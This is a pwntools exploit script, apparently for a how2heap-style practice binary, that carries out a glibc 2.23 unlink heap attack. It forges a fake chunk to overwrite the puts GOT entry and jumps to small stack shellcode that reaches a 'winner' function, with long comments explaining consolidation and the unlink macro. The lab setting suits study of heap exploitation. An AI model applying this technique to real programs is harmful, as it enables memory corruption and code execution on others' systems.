'''
Original Unlink: 
- Uses an altering LibC that edits the 'unlink' macro to remove the protections


Issues: 
- Altering the unlink macro to be a function for debugging is TERRIBLY annoying 
- HEAP is not? possible to make executable. So, I had to force this to jump to the stack instead. 
- CANNOT get symbols to stick :( 
	- Unsure why
'''

from pwn import * 
import os

mode = 'DEBUG' # Turn on gdb
libc_name = '/home/strikeout/Desktop/tools/how2heap/glibc_versions/libc-2.23-unlink.so' # For alternate version of libc

env = {}

# Binary setup
elf_name = 'unlink'

elf = ELF(elf_name)
if libc_name != '': 
	libc = ELF(libc_name)
	env = {"LD_PRELOAD": libc.path}
	
# Process creation 
if mode == 'DEBUG': 
	p = process(['/home/strikeout/Desktop/tools/how2heap/glibc_versions/ld-2.23-unlink.so',elf.path],env=env, aslr=False)
	gdb.attach(p) # 'dir /home/strikeout/Desktop/tools/how2heap/glibc_src/malloc\n') 
else: 
	p = process(elf.path, env=env) 


'''
Unlinking
=====================

When two chunks are adjacent and BOTH are free (not including fastbins) 
the chunks are merged together to create a combined chunk. This is done
in order to prevent fragmentation in the heap. This is called 
'consolidation'. 

How is this done in practice? One chunk is already in a 'bin' (doubly linked list). 
So, we must UNLINK (the purpose of this attack) the chunk from the current bin. 
Then, once the chunk has been unlinked, the current chunk and the newly
unlinked chunk are *combined* to make a larger chunk. This can happen 
both from the FORWARD and the BACKWARDS sides. 
Once this is done, the chunk is put into the unsorted bin. 

The macro for the unlinking code looks like the following: 
#define unlink(P, BK, FD) {                                            \
  FD = P->fd;                                                          \
  BK = P->bk;                                                          \
  FD->bk = BK;                                                         \
  BK->fd = FD;                                                         \
}

  a            b            c
______       _______       _____
|  |  | ---> |  |  | -- > |  |  |
|__|__| <--- |__|__| <--- |__|__|
 fd bk        fd bk        fd  bk

The 'FD' is the forward chunk and the 'BK' is the backwards chunk
(think in terms of a doubly linked list). 
The current chunk is essentially just removed by editing the 
two pointers for the different doubly linked lists (bk->fd and fd->bk). 

From the doubly linked list from above, the main goal is to REMOVE 
'b' from the list. This is done by setting a's fd to point to c and 
'c's bk to point to a. 

The idea behind this attack is about controlling the 'FD' and 'BK' pointers. 
If we control those while the unlinking process is happening, then 
we control WHERE to write to :) 


Notes of Caution
==================

All of the things stated above are true in the GENERAL case. However, 
there are some special cases too. 

For consolidation, there are three exceptions to the rule: 
- Tcache/fastbin chunks (although in a bin while free) do not change the 
  prev_inuse bit for speed purposes. So, consolidation does not occur.
- If the chunk adjacent to the top_chunk is freed, then this chunk
  gets absorted into the top_chunk instead of going into the bin.
- The FIRST chunk always has the prev_inuse bit set. 
'''

####################
## Important Values#
####################

winner_func = 0x400776
puts_GOT = 0x601020
heap_base = 0x155555556000
stack_loc = 0x7fffffffebd0 # May need to change

def shellcode():
	#############
	# Shellcode #
	#############
	'''
	My goal was to jump to shellcode then jump to the winner function. 
	However, the jmp and call instructions are RELATIVE. 
	So, because RET is ABSOLUTE I used this assembly instruction to 
	jump to 'winner'. 

	0:  68 76 07 40 00          push   0x400776
	5:  c3                      ret 
	'''
	#shellcode = "\x90" * 8
	#shellcode += "\xcc"
	my_shellcode = "\x68\x76\x07\x40\x00\xC3"
	return my_shellcode

def unlink():
	################
	## Unlink ######
	################ 
	'''

	Heap Layout
	=====================
	The basic description of unlink can be seen above... Review
	this for details on unlink. 

	Here is the layout of the heap, without altering metadata: 

	--- Chunk a ---
	0x0 -- prev_size 
	0x91 -- size, with prev_inuse set
	--- Chunk b --- 
	0x0 -- prev_size 
	0x91 -- size, with prev_inuse set
	------------

	Attack 
	====================

	The goal of this attack is to create a FAKE consolidation to force 
	a bad unlink. So, we need to make the freeing of chunk 'b' to look
	like there is a free chunk below it (in a). 

	How does this check occur? The code (https://elixir.bootlin.com/glibc/glibc-2.23/source/malloc/malloc.c#L4001) 
	checks to see if the prev_inuse bit is set. 

	So, if we ALTER the prev_inuse bit of chunk 'b', then chunk 'b' will 
	attempt to consolidate with chunk 'a'. This consoidation causes an 
	unlink to occur within chunk 'a'! Now, we control all data 
	associated with the unlink itself (in particular, fd and bk). 

	Below, is the example of the exploit (we only control chunk a's data): 

	--- Chunk a ---
	0x0 -- prev_size 
	0x91 -- size, with prev_inuse set
	fd (fake) 
	bk (fake) 
	--- Chunk b --- 
	0x90 -- prev_size, set this to point to chunk 'a'. 
	0x90 -- size, with prev_inuse NOT set, from attack, to force unlink :) 
	------------


	Arbitrary Write 
	====================

	Now, if we edit the location of 'fd' and 'bk' to be good locations, 
	we have an arbitrary write :) This is because of the macro from before... 
	In particular: 

	  BK + 0x10 = FD
	  FD + 0x18 = BK

	This means that BOTH sections have to be 'writable'. So, we cannot 
	write the address of system to where ever we want, sadly. 


	What To Write 
	====================

	In order to pwn the system, the best thing is to redirect 
	code execution. In this case, because the stack/heap are 
	executable (and writable) we can WRITE some function pointer 
	to jump there to run shellcode. 

	Two main options: 
		- Without ASLR, we can overwrite a RET address. 
		- puts GOT entry 

	For the sake of example, we will overwrite the put GOT entry 
	with stack/heap address. Then, jump to that location :) 

	'''

	# Setup fd and bk for unlink attack :) 
	# Set one to puts GOT in order to redirect code execution from the function is called 
	# Set the other to the place to JUMP to (stack) for shellcode. 
	fake_chunk = p64(puts_GOT - 0x18) # fd 
	fake_chunk += p64(stack_loc) # bk 


	fake_chunk += "A" * 0x70 # Filler prior to chunk 'b' 

	# Set the prev_inuse to go directly back to the previous chunk to unlink it. 
	fake_chunk += p64(0x90)  # Prev_size
	'''
	Overwrite the size of the chunk to be '0x90' instead of 0x91. 
	This starts a 'backwards consolidation' process. 
	In order to combine the chunks, an unlinking on the previous chunk
	happens. 
	'''
	fake_chunk += p64(0x90)  # Overwrite the size to have the prev_inuse not set
	return fake_chunk


p.sendline(shellcode())
p.sendline(unlink()) # Corrupt chunk to perform unlinking later
p.interactive()
